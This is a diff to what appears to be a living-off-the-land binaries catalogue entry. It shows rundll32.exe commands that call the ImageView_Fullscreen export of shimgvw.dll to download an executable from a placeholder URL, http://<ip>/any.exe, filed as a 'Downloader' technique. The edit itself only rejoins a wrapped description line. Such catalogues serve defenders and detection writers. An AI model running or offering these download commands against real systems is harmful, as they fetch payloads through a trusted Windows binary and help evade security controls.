@@ -6,8 +6,7 @@ Created: '2021-01-06'
 Commands:
   - Command: rundll32.exe  "c:\windows\system32\shimgvw.dll",ImageView_Fullscreen http://<ip>/any.exe
   - Command: rundll32.exe  "c:\windows\system32\shimgvw.dll",ImageView_FullscreenA http://<ip>/any.exe
-    Description: Once executed, rundll32.exe will download the file at the URL in the command to:
-AppData\Local\Microsoft\Windows\INetCache\IE\<random>\any[1].exe.
+    Description: Once executed, rundll32.exe will download the file at the URL in the command to:AppData\Local\Microsoft\Windows\INetCache\IE\<random>\any[1].exe.
     Usecase: Downloader
     Category: Download
     Privileges: User
